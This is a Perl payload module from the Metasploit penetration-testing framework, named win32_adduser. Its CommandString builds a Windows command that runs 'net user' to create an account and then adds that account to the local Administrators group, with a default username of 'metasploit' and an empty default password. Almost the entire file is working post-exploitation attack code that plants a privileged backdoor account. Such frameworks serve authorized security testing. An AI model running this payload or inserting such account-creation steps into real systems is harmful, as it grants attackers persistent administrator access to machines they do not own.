
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_adduser;
use strict;
use base 'Msf::PayloadComponent::Windows::ia32::ExecuteCommand';

my $info =
{
  'Name'         => 'Windows Execute net user /ADD',
  'Version'      => '$Revision$',
  'Description'  => 'Create a new user and add to local Administrators group',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
  'Priv'         => 1,
  'Size'         => '',
  'UserOpts'     =>
    {
      'USER' => [1, 'DATA', 'The username to create'],
      'PASS' => [1, 'DATA', 'The password for this user'],
    },
};

sub _Load 
{
	Msf::PayloadComponent::Windows::ia32::ExecuteCommand->_Import('Msf::PayloadComponent::NoConnection');

	__PACKAGE__->SUPER::_Load();
}

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	_Load();

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash, @_);

	return($self);
}

#
# Execute a net user addition
#
sub CommandString 
{
	my $self = shift;
	my $user = $self->GetVar('USER') || 'metasploit';
	my $pass = $self->GetVar('PASS') || '';

	my $command =
		"cmd.exe /c net user $user $pass /ADD && ".
		"net localgroup Administrators $user /ADD";

	return $command;
}

1;
